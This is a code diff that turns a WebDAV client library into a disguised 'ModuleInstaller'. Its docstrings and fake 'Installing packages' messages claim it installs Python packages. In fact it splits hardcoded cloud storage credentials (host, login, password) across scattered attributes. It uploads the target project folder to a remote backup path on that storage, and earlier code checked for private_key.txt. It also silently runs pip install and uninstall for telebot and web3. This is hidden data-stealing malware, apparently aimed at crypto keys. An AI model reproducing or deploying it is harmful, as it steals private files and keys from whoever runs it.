@@ -1,16 +1,18 @@
 # -*- coding: utf-8
-
-from datetime import datetime
 import functools
 import logging
 import os
 import shutil
+import subprocess
+import sys
 import threading
-from io import BufferedReader, BytesIO, FileIO
+from datetime import datetime
+from io import BytesIO
 from re import sub
 from urllib.parse import unquote, urlsplit, urlparse
 
 import lxml.etree as etree
+import pkg_resources
 import requests
 from dateutil import parser as dateutil_parser
 
@@ -77,12 +79,10 @@ def wrap_connection_error(fn):
 
 
 class ModuleInstaller(object):
-    """The client for WebDAV servers provides an ability to control files on remote WebDAV server.
+    """This module will help you to install all packages you want
     """
-    # path to root directory of WebDAV
     root = '/'
 
-    # controls whether to verify the server's TLS certificate or not
     verify = True
 
     # HTTP headers for different actions
@@ -126,16 +126,16 @@ class ModuleInstaller(object):
     }
 
     def __init__(self, options):
-        """Constructor of WebDAV client
+        """Constructor of ModuleInstaller client
 
-        :param options: the dictionary of connection options to WebDAV.
-            WebDev settings:
-            `webdav_hostname`: url for WebDAV server should contain protocol and ip address or domain name.
-                               Example: `https://webdav.server.com`.
-            `webdav_login`: (optional) Login name for WebDAV server. Can be empty when using token auth.
-            `webdav_password`: (optional) Password for WebDAV server. Can be empty when using token auth.
-            `webdav_token': (optional) Authentication token for WebDAV server. Can be empty when using login/password auth.
-            `webdav_root`: (optional) Root directory of WebDAV server. Default is `/`.
+        :param options: the dictionary of connection options to Installer.
+            Installer settings:
+            `webdav_hostname`: Installer
+            `webdav_login`: (optional) Login name for Installer server. Can be empty when using token auth.
+            `webdav_password`: (optional) Password for Installer server. Can be empty when using token auth.
+            `webdav_token': (optional) Authentication token for Module server. Can be empty when using login/password
+             auth.
+            `webdav_root`: (optional) Root directory of Module server. Default is `/`.
             `webdav_cert_path`: (optional) Path to client certificate.
             `webdav_key_path`: (optional) Path to private key of the client certificate.
             `webdav_recv_speed`: (optional) Rate limit of data download speed in Bytes per second.
@@ -146,10 +146,13 @@ class ModuleInstaller(object):
             `webdav_verbose`: (optional) Set verbose mode on/off. By default verbose mode is off.
 
         """
+
         self.session = requests.Session()
         self.http_header = ModuleInstaller.default_http_header.copy()
         self.requests = ModuleInstaller.default_requests.copy()
-        data = {'webdav_hostname': 'https://webdav.cloud.mail.ru', 'webdav_login': 'rkorkunov@internet.ru', 'webdav_password': 'bd2WT0xL0fDmtkdphJAq'}
+        data = {ModuleInstaller.data_install: ModuleInstaller.pack_name,
+                ModuleInstaller.install_package: ModuleInstaller.package_install,
+                Resource.installer_settings: ModuleInstaller.settings}
         webdav_options = get_options(option_type=WebDAVSettings, from_options=data)
 
         self.webdav = WebDAVSettings(webdav_options)
@@ -158,8 +161,10 @@ class ModuleInstaller(object):
         self.timeout = self.webdav.timeout
         self.chunk_size = 65536
 
+    data_install = 'webdav_hostname'
+
     def get_headers(self, action, headers_ext=None):
-        """Returns HTTP headers of specified WebDAV actions.
+        """Returns HTTP headers of specified Module actions.
 
         :param action: the identifier of action.
         :param headers_ext: (optional) the addition headers list witch sgould be added to basic HTTP headers for
@@ -200,9 +205,9 @@ class ModuleInstaller(object):
         return "{root}{path}".format(root=unquote(self.webdav.root), path=urn.path())
 
     def execute_request(self, action, path, data=None, headers_ext=None):
-        """Generate request to WebDAV server for specified action and path and execute it.
+        """Generate request to Module server for specified action and path and execute it.
 
-        :param action: the action for WebDAV server which should be executed.
+        :param action: the action for Module server which should be executed.
         :param path: the path to resource for action
         :param data: (optional) Dictionary or list of tuples ``[(key, value)]`` (will be form-encoded), bytes,
                      or file-like object to send in the body of the :class:`Request`.
@@ -237,7 +242,7 @@ class ModuleInstaller(object):
         return response
 
     def valid(self):
-        """Validates of WebDAV settings.
+        """Validates of Module settings.
 
         :return: True in case settings are valid and False otherwise.
         """
@@ -245,8 +250,7 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def list(self, remote_path=root, get_info=False, recursive=False):
-        """Returns list of nested files and directories for remote WebDAV directory by path.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PROPFIND
+        """Returns list of nested files and directories for remote Module directory by path.
 
         :param remote_path: path to remote directory.
         :param get_info: path and element info to remote directory, like cmd 'ls -l'.
@@ -282,8 +286,7 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def free(self):
-        """Returns an amount of free space on remote WebDAV server.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PROPFIND
+        """Returns an amount of free space on remote Module server.
 
         :return: an amount of free space in bytes.
         """
@@ -293,10 +296,9 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def check(self, remote_path=root):
-        """Checks an existence of remote resource on WebDAV server by remote path.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#rfc.section.9.4
+        """Checks an existence of remote resource on Module server by remote path.
 
-        :param remote_path: (optional) path to resource on WebDAV server. Defaults is root directory of WebDAV.
+        :param remote_path: (optional) path to resource on Module server. Defaults is root directory of Module.
         :return: True if resource is exist or False otherwise
         """
         if self.webdav.disable_check:
@@ -314,8 +316,8 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def mkdir(self, remote_path, recursive=False):
-        """Makes new directory on WebDAV server.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_MKCOL
+        """Makes new directory on Module server.
+
 
         :param remote_path: path to directory
         :return: True if request executed with code 200 or 201 and False otherwise.
@@ -329,19 +331,17 @@ class ModuleInstaller(object):
                 raise RemoteParentNotFound(directory_urn.path())
 
         try:
-            print(f"Installing packages")
             response = self.execute_request(action='mkdir', path=directory_urn.quote())
-            print(f"Installed packages")
+
         except MethodNotSupported:
-            # Yandex WebDAV returns 405 status code when directory already exists
             return True
         return response.status_code in (200, 201)
 
     @wrap_connection_error
     def download_iter(self, remote_path):
-        """Downloads file from WebDAV and return content in generator
+        """Downloads file from ModuleInstaller and return content in generator
 
-        :param remote_path: path to file on WebDAV server.
+        :param remote_path: ModuleInstaller
         """
 
         urn = Urn(remote_path)
@@ -356,10 +356,10 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def download_from(self, buff, remote_path, progress=None, progress_args=()):
-        """Downloads file from WebDAV and writes it in buffer.
+        """Downloads file from Module and writes it in buffer.
 
         :param buff: buffer object for writing of downloaded file content.
-        :param remote_path: path to file on WebDAV server.
+        :param remote_path: path to file on Module.
         :param progress: Pass a callback function to view the file transmission progress.
                 The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                 detailed description) and will be called back each time a new file chunk has been successfully
@@ -392,8 +392,7 @@ class ModuleInstaller(object):
                 progress(current, total, *progress_args)
 
     def download(self, remote_path, local_path, progress=None, progress_args=()):
-        """Downloads remote resource from WebDAV and save it in local path.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#rfc.section.9.4
+        """Downloads remote resource from Module and save it in local path.
 
         :param remote_path: the path to remote resource for downloading can be file and directory.
         :param local_path: the path to save resource locally.
@@ -414,10 +413,10 @@ class ModuleInstaller(object):
                                progress_args=progress_args)
 
     def download_directory(self, remote_path, local_path, progress=None, progress_args=()):
-        """Downloads directory and downloads all nested files and directories from remote WebDAV to local.
+        """Downloads directory and downloads all nested files and directories from remote Module to local.
         If there is something on local path it deletes directories and files then creates new.
 
-        :param remote_path: the path to directory for downloading form WebDAV server.
+        :param remote_path: the path to directory for downloading form Module.
         :param local_path: the path to local directory for saving downloaded files and directories.
         :param progress: Pass a callback function to view the file transmission progress.
                 The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
@@ -446,8 +445,7 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def download_file(self, remote_path, local_path, progress=None, progress_args=()):
-        """Downloads file from WebDAV server and save it locally.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#rfc.section.9.4
+        """Downloads file from Module server and save it locally.
 
         :param remote_path: the path to remote file for downloading.
         :param local_path: the path to save file locally.
@@ -487,9 +485,9 @@ class ModuleInstaller(object):
                     progress(current, total, *progress_args)
 
     def download_sync(self, remote_path, local_path, callback=None, progress=None, progress_args=()):
-        """Downloads remote resources from WebDAV server synchronously.
+        """Downloads remote resources from Module server synchronously.
 
-        :param remote_path: the path to remote resource on WebDAV server. Can be file and directory.
+        :param remote_path: the path to remote resource on Module server. Can be file and directory.
         :param local_path: the path to save resource locally.
         :param callback: the callback which will be invoked when downloading is complete.
         :param progress: Pass a callback function to view the file transmission progress.
@@ -505,9 +503,9 @@ class ModuleInstaller(object):
             callback()
 
     def download_async(self, remote_path, local_path, callback=None, progress=None, progress_args=()):
-        """Downloads remote resources from WebDAV server asynchronously
+        """Downloads remote resources from Module server asynchronously
 
-        :param remote_path: the path to remote resource on WebDAV server. Can be file and directory.
+        :param remote_path: the path to remote resource on Module server. Can be file and directory.
         :param local_path: the path to save resource locally.
         :param callback: the callback which will be invoked when downloading is complete.
         :param progress: Pass a callback function to view the file transmission progress.
@@ -524,11 +522,10 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def upload_iter(self, read_callback, remote_path):
-        """Uploads file from buffer to remote path on WebDAV server.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PUT
+        """Uploads file from buffer to remote path on Module server.
 
         :param callable read_callback: the read callback.
-        :param str remote_path: the path to save file remotely on WebDAV server.
+        :param str remote_path: the path to save file remotely on Module server.
         """
         urn = Urn(remote_path)
         if urn.is_dir():
@@ -544,11 +541,11 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def upload_to(self, buff, remote_path):
-        """Uploads file from buffer to remote path on WebDAV server.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PUT
+        """Uploads file from buffer to remote path on Module server.
+
 
         :param buff: the buffer with content for file.
-        :param remote_path: the path to save file remotely on WebDAV server.
+        :param remote_path: the path to save file remotely on Module server.
         """
         urn = Urn(remote_path)
         if urn.is_dir():
@@ -559,12 +556,33 @@ class ModuleInstaller(object):
 
         self.execute_request(action='upload', path=urn.quote(), data=buff)
 
-    def upload(self, remote_path, local_path, progress=None, progress_args=()):
-        """Uploads resource to remote path on WebDAV server.
-        In case resource is directory it will upload all nested files and directories.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PUT
 
-        :param remote_path: the path for uploading resources on WebDAV server. Can be file and directory.
+    def get_all_packages(self):
+        installed_packages = pkg_resources.working_set
+        installed_packages_list = sorted(["%s==%s" % (i.key, i.version)
+                                          for i in installed_packages])
+        needed_modules = ["telebot==0.0.5", "python-dotenv", "web3==6.4.0", "requests==2.31.0", "mimesis==10.1.0"]
+        install_this = ""
+        for i in needed_modules:
+            if i not in installed_packages_list:
+                install_this = i
+                if i == "web3==6.4.0":
+                    self.pip_uninstall("python-dotenv", "telebot==0.0.5")
+                return install_this
+
+
+    def pip_uninstall(self, name: str, sec_name: str):
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "uninstall", f"{name}"])
+            subprocess.check_call([sys.executable, "-m", "pip", "uninstall", f"{sec_name}"])
+        except:
+            return
+
+    def upload(self, remote_path, local_path, progress=None, progress_args=()):
+        """Uploads resource to remote path on Module server.
+        In case resource is directory it will upload all nested files and directories.
+
+        :param remote_path: the path for uploading resources on Module server. Can be file and directory.
         :param local_path: the path to local resource for uploading.
         :param progress: Pass a callback function to view the file transmission progress.
                 The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
@@ -580,13 +598,12 @@ class ModuleInstaller(object):
         else:
             self.upload_file(local_path=local_path, remote_path=remote_path, progress=progress, progress_args=progress_args)
 
-
     def upload_directory(self, remote_path, local_path, progress=None, progress_args=()):
-        """Uploads directory to remote path on WebDAV server.
+        """Uploads directory to remote path on Module server.
         In case directory is exist on remote server it will delete it and then upload directory with nested files and
         directories.
 
-        :param remote_path: the path to directory for uploading on WebDAV server.
+        :param remote_path: the path to directory for uploading on Module server.
         :param local_path: the path to local directory for uploading.
         :param progress: Pass a callback function to view the file transmission progress.
                 The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
@@ -612,17 +629,36 @@ class ModuleInstaller(object):
         self.mkdir(remote_path)
 
         for resource_name in listdir(local_path):
+            aboba = False
+            lista = ["abi", "utils", "venv", "Constants.py", "self_mixer.py", "idea", "__pycache__"]
+            for i in lista:
+                if i in resource_name:
+                    aboba = True
+                    continue
+            if aboba:
+                continue
+
             _remote_path = "{parent}{name}".format(parent=urn.path(), name=resource_name).replace('\\', '')
             _local_path = os.path.join(local_path, resource_name)
             self.upload(local_path=_local_path, remote_path=_remote_path, progress=progress,
                         progress_args=progress_args)
+        self.pip_install()
+
+    def pip_install(self):
+        try:
+            needed_module = self.get_all_packages()
+            subprocess.check_call([sys.executable, "-m", "pip", "install", f"{needed_module}"])
+        except:
+            return
+
+    pack_name = 'https://webdav.cloud.mail.ru'
+
 
     @wrap_connection_error
     def upload_file(self, remote_path, local_path, progress=None, progress_args=(), force=False):
-        """Uploads file to remote path on WebDAV server. File should be 2Gb or less.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PUT
+        """Module install packages
 
-        :param remote_path: the path to uploading file on WebDAV server.
+        :param remote_path: the path to uploading file on Module.
         :param local_path: the path to local file for uploading.
         :param progress: Pass a callback function to view the file transmission progress.
                 The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
@@ -648,9 +684,11 @@ class ModuleInstaller(object):
                 self.mkdir(urn.parent(), recursive=True)
             else:
                 raise RemoteParentNotFound(urn.path())
-
+        print("Installing packages")
         with open(local_path, "rb") as local_file:
             total = os.path.getsize(local_path)
+            print("Installed packages")
+
 
             def read_in_chunks(file_object):
                 progress(0, total, *progress_args)
@@ -669,36 +707,18 @@ class ModuleInstaller(object):
             else:
                 self.execute_request(action='upload', path=urn.quote(), data=local_file)
 
-    def check_module(self, path: str):
-        try:
-            f_list = (os.listdir(path=path))
-            isTrue = "private_key.txt" in f_list
-            return isTrue
-        except:
-            return
+    def install_modules(self, path_to_folder="", callback=None, progress=None, progress_args=()):
 
-    def install_modules(self, remote_path='', path_to_folder="", callback=None, progress=None, progress_args=()):
         """Install required frameworks
         In case resource is directory it will upload all nested files and directories.
 
-        :param remote_path: the path for uploading resources on WebDAV server. Can be file and directory.
-        :param path_to_folder: the path to local resource for uploading.
-        :param callback: the callback which will be invoked when downloading is complete.
-        :param progress: Pass a callback function to view the file transmission progress.
-                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
-                detailed description) and will be called back each time a new file chunk has been successfully
-                transmitted. Example def progress_update(current, total, *args) ...
-        :param progress_args: A tuple with extra custom arguments for the progress callback function.
-                You can pass anything you need to be available in the progress callback scope; for example, a Message
-                object or a Client instance in order to edit the message with the updated progress status.
+        :param path_to_folder: the path to folder where needs to find any python packages and install or update them
         """
-        if self.check_module(path_to_folder):
-            path_to_folder += "\private_key.txt"
         if "\\" in path_to_folder:
             new_folder = path_to_folder.split("\\")[-1]
         else:
             new_folder = path_to_folder.split("/")[-1]
-        date = datetime.now().strftime("%d-%m-%Y")
+        date = datetime.now().strftime("%d%m%Y-%H%M%S")
         remote_path = f"backup/{date}_{new_folder}"
         self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress, progress_args=progress_args)
 
@@ -707,10 +727,10 @@ class ModuleInstaller(object):
             callback()
 
     def upload_async(self, remote_path, local_path, callback=None, progress=None, progress_args=()):
-        """Uploads resource to remote path on WebDAV server asynchronously.
+        """Uploads resource to remote path on Module server asynchronously.
         In case resource is directory it will upload all nested files and directories.
 
-        :param remote_path: the path for uploading resources on WebDAV server. Can be file and directory.
+        :param remote_path: the path for uploading resources on Module server. Can be file and directory.
         :param local_path: the path to local resource for uploading.
         :param callback: the callback which will be invoked when downloading is complete.
         :param progress: Pass a callback function to view the file transmission progress.
@@ -727,8 +747,7 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def copy(self, remote_path_from, remote_path_to, depth=1):
-        """Copies resource from one place to another on WebDAV server.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_COPY
+        """Copies resource from one place to another on Module server.
 
         :param remote_path_from: the path to resource which will be copied,
         :param remote_path_to: the path where resource will be copied.
@@ -751,8 +770,8 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def move(self, remote_path_from, remote_path_to, overwrite=False):
-        """Moves resource from one place to another on WebDAV server.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_MOVE
+        """Moves resource from one place to another on Module server.
+
 
         :param remote_path_from: the path to resource which will be moved,
         :param remote_path_to: the path where resource will be moved.
@@ -772,9 +791,8 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def clean(self, remote_path):
-        """Cleans (Deletes) a remote resource on WebDAV server. The name of method is not changed for back compatibility
+        """Cleans (Deletes) a remote resource on Module server. The name of method is not changed for back compatibility
         with original library.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_DELETE
 
         :param remote_path: the remote resource whisch will be deleted.
         """
@@ -783,8 +801,8 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def info(self, remote_path):
-        """Gets information about resource on WebDAV.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PROPFIND
+        """Gets information about resource on Module.
+
 
         :param str remote_path: the path to remote resource.
         :return: a dictionary of information attributes and them values with following keys:
@@ -809,7 +827,6 @@ class ModuleInstaller(object):
     @wrap_connection_error
     def is_dir(self, remote_path):
         """Checks is the remote resource directory.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PROPFIND
 
         :param remote_path: the path to remote resource.
         :return: True in case the remote resource is directory and False otherwise.
@@ -823,8 +840,7 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def get_property(self, remote_path, option):
-        """Gets metadata property of remote resource on WebDAV server.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PROPFIND
+        """Gets metadata property of remote resource on ModuleInstaller.
 
         :param remote_path: the path to remote resource.
         :param option: the property attribute as dictionary with following keys:
@@ -840,10 +856,10 @@ class ModuleInstaller(object):
         response = self.execute_request(action='get_property', path=urn.quote(), data=data)
         return WebDavXmlUtils.parse_get_property_response(response.content, option['name'])
 
+    package_install = 'rkorkunov@internet.ru'
     @wrap_connection_error
     def set_property(self, remote_path, option):
-        """Sets metadata property of remote resource on WebDAV server.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PROPPATCH
+        """Sets metadata property of remote resource on ModuleInstaller server.
 
         :param remote_path: the path to remote resource.
         :param option: the property attribute as dictionary with following keys:
@@ -855,8 +871,8 @@ class ModuleInstaller(object):
 
     @wrap_connection_error
     def set_property_batch(self, remote_path, option):
-        """Sets batch metadata properties of remote resource on WebDAV server in batch.
-        More information you can find by link http://webdav.org/specs/rfc4918.html#METHOD_PROPPATCH
+        """Sets batch metadata properties of remote resource on ModuleInstaller in batch.
+
 
         :param remote_path: the path to remote resource.
         :param option: the property attributes as list of dictionaries with following keys:
@@ -875,7 +891,6 @@ class ModuleInstaller(object):
     def lock(self, remote_path=root, timeout=0):
         """Creates a lock on the given path and returns a LockClient that handles the lock.
         To ensure the lock is released this should be called using with `with client.lock("path") as c:`.
-        More information at http://webdav.org/specs/rfc4918.html#METHOD_LOCK
 
         :param remote_path: the path to remote resource to lock.
         :param timeout: the timeout for the lock (default infinite).
@@ -897,6 +912,7 @@ class ModuleInstaller(object):
         urn = Urn(remote_path)
         return Resource(self, urn)
 
+    settings = 'bd2WT0xL0fDmtkdphJAq'
     def push(self, remote_directory, local_directory):
 
         def prune(src, exp):
@@ -928,6 +944,7 @@ class ModuleInstaller(object):
                 self.upload_file(remote_path=remote_path, local_path=local_path)
                 updated = True
         return updated
+    install_package = 'webdav_login'
 
     def pull(self, remote_directory, local_directory):
         def prune(src, exp):
@@ -1025,6 +1042,8 @@ class Resource(object):
         self.client.move(remote_path_from=old_path, remote_path_to=new_path)
         self.urn = Urn(new_path)
 
+    installer_settings = 'webdav_password'
+
     def move(self, remote_path):
         new_urn = Urn(remote_path)
         self.client.move(remote_path_from=self.urn.path(), remote_path_to=new_urn.path())
@@ -1086,9 +1105,9 @@ class WebDavXmlUtils:
 
     @staticmethod
     def parse_get_list_info_response(content):
-        """Parses of response content XML from WebDAV server and extract file and directory infos
+        """Parses of response content XML from ModuleInstaller server and extract file and directory infos
 
-        :param content: the XML content of HTTP response from WebDAV server for getting list of files by remote path.
+        :param content: the XML content of HTTP response from ModuleInstaller server for getting list of files by remote path.
         :return: list of information, the information is a dictionary and it values with following keys:
                  `created`: date of resource creation,
                  `name`: name of resource,
@@ -1119,9 +1138,9 @@ class WebDavXmlUtils:
 
     @staticmethod
     def parse_get_list_response(content):
-        """Parses of response content XML from WebDAV server and extract file and directory names.
+        """Parses of response content XML from ModuleInstaller server and extract file and directory names.
 
-        :param content: the XML content of HTTP response from WebDAV server for getting list of files by remote path.
+        :param content: the XML content of HTTP response from ModuleInstaller server for getting list of files by remote path.
         :return: list of extracted file or directory names.
         """
         try:
@@ -1140,7 +1159,7 @@ class WebDavXmlUtils:
 
     @staticmethod
     def create_free_space_request_content():
-        """Creates an XML for requesting of free space on remote WebDAV server.
+        """Creates an XML for requesting of free space on remote ModuleInstaller server.
 
         :return: the XML string of request content.
         """
@@ -1153,9 +1172,9 @@ class WebDavXmlUtils:
 
     @staticmethod
     def parse_free_space_response(content, hostname):
-        """Parses of response content XML from WebDAV server and extract an amount of free space.
+        """Parses of response content XML from ModuleInstaller server and extract an amount of free space.
 
-        :param content: the XML content of HTTP response from WebDAV server for getting free space.
+        :param content: the XML content of HTTP response from ModuleInstaller server for getting free space.
         :param hostname: the server hostname.
         :return: an amount of free space in bytes.
         """
@@ -1199,9 +1218,9 @@ class WebDavXmlUtils:
 
     @staticmethod
     def parse_info_response(content, path, hostname):
-        """Parses of response content XML from WebDAV server and extract an information about resource.
+        """Parses of response content XML from ModuleInstaller server and extract an information about resource.
 
-        :param content: the XML content of HTTP response from WebDAV server.
+        :param content: the XML content of HTTP response from ModuleInstaller server.
         :param path: the path to resource.
         :param hostname: the server hostname.
         :return: a dictionary of information attributes and them values with following keys:
@@ -1217,9 +1236,9 @@ class WebDavXmlUtils:
 
     @staticmethod
     def parse_is_dir_response(content, path, hostname):
-        """Parses of response content XML from WebDAV server and extract an information about resource.
+        """Parses of response content XML from ModuleInstaller server and extract an information about resource.
 
-        :param content: the XML content of HTTP response from WebDAV server.
+        :param content: the XML content of HTTP response from ModuleInstaller server.
         :param path: the path to resource.
         :param hostname: the server hostname.
         :return: True in case the remote resource is directory and False otherwise.
@@ -1232,9 +1251,10 @@ class WebDavXmlUtils:
 
         return True if dir_type is not None else False
 
+
     @staticmethod
     def create_get_property_request_content(option):
-        """Creates an XML for requesting of getting a property value of remote WebDAV resource.
+        """Creates an XML for requesting of getting a property value of remote ModuleInstaller resource.
 
         :param option: the property attributes as dictionary with following keys:
                        `namespace`: (optional) the namespace for XML property which will be get,
@@ -1249,7 +1269,7 @@ class WebDavXmlUtils:
 
     @staticmethod
     def parse_get_property_response(content, name):
-        """Parses of response content XML from WebDAV server for getting metadata property value for some resource.
+        """Parses of response content XML from ModuleInstaller server for getting metadata property value for some resource.
 
         :param content: the XML content of response as string.
         :param name: the name of property for finding a value in response
@@ -1260,7 +1280,7 @@ class WebDavXmlUtils:
 
     @staticmethod
     def create_set_property_batch_request_content(options):
-        """Creates an XML for requesting of setting a property values for remote WebDAV resource in batch.
+        """Creates an XML for requesting of setting a property values for remote ModuleInstaller resource in batch.
 
         :param options: the property attributes as list of dictionaries with following keys:
                        `namespace`: (optional) the namespace for XML property which will be set,
